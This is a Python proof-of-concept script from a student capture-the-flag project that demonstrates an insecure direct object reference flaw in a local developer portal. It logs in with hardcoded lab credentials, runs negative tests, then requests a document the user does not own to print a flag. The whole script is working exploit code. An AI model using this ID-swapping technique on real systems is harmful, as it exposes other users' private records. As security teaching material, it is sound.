"""
PS-03 Compromised Developer Portal - IDOR Proof of Concept
CyberTrace: Project Shadow
Author: Adhikari A.M.G.R (IT24100062)

Purpose:
Demonstrates the broken object-level authorization (IDOR) vulnerability
in the PS-03 developer portal. The authenticated user 'shadow_dev' owns
documents with predictable sequential IDs (1 and 3). This script shows
that changing only the document ID in an authenticated request grants
access to a restricted record (ID 2) that was never linked to the user.

Scope: targets ONLY the local isolated CTF instance at localhost:8083.
Do not point this script at any other host.
"""

import requests

BASE_URL = "http://localhost:8083"

# Credentials recovered from PS-02 (Vigenere-decrypted research note)
USERNAME = "shadow_dev"
ACCESS_PHRASE = "ShadowAccess27"

# A document ID the authenticated user actually owns (used to prove login works)
OWNED_DOCUMENT_ID = 1

# The restricted document ID we are NOT supposed to be able to read
TARGET_DOCUMENT_ID = 2


def login(session):
    """Authenticate using PS-02 credentials and return True if successful."""
    login_url = f"{BASE_URL}/login"
    payload = {
        "username": USERNAME,
        "access_phrase": ACCESS_PHRASE,
    }
    session.post(login_url, data=payload, allow_redirects=True)

    check = session.get(f"{BASE_URL}/documents")
    if "Authenticated as" in check.text:
        print("[+] Login successful.")
        return True
    else:
        print("[-] Login failed. Check username/access phrase.")
        return False


def fetch_document(session, doc_id):
    """Request a document by ID and return the response text."""
    url = f"{BASE_URL}/document/{doc_id}"
    response = session.get(url)
    return response.status_code, response.text


def test_invalid_login():
    """Negative test: wrong credentials must NOT authenticate."""
    session = requests.Session()
    payload = {
        "username": "shadow_dev",
        "access_phrase": "wrong_phrase_123",
    }
    session.post(f"{BASE_URL}/login", data=payload, allow_redirects=True)
    check = session.get(f"{BASE_URL}/documents")

    if "Authenticated as" in check.text:
        print("[-] UNEXPECTED: Invalid credentials were accepted!")
    else:
        print("[+] Invalid credentials correctly rejected.")



def test_no_auth_access():
    """Negative test: accessing a document with NO session/login at all must fail."""
    session = requests.Session()  # fresh session, never logged in

    status, body = fetch_document(session, TARGET_DOCUMENT_ID)
    print(f"\n[*] Requesting restricted document {TARGET_DOCUMENT_ID} with NO login -> HTTP {status}")

    if status == 200 and "CyberTrace{" in body:
        print("[-] UNEXPECTED: Restricted document accessible with no authentication at all!")
    else:
        print("[+] Correctly blocked: unauthenticated access to restricted document denied.") 


def main():
    session = requests.Session()

    if not login(session):
        return

    # Negative test: confirm wrong credentials are rejected
    test_invalid_login()

    # Negative test: confirm zero-session access is rejected
    test_no_auth_access()

    status, body = fetch_document(session, OWNED_DOCUMENT_ID)
    ...

    status, body = fetch_document(session, OWNED_DOCUMENT_ID)
    print(f"\n[*] Requesting owned document {OWNED_DOCUMENT_ID} -> HTTP {status}")
    if status == 200:
        print("[+] Owned document retrieved successfully (expected).")

    status, body = fetch_document(session, TARGET_DOCUMENT_ID)
    print(f"\n[*] Requesting restricted document {TARGET_DOCUMENT_ID} -> HTTP {status}")

    if status == 200 and "Restricted" in body:
        print("[!] VULNERABLE: Restricted document was returned without ownership check.")
        for line in body.splitlines():
            if "CyberTrace{" in line:
                print(f"[FLAG] {line.strip()}")
    else:
        print("[-] Restricted document was not accessible (not vulnerable, or login failed).")


if __name__ == "__main__":
    main()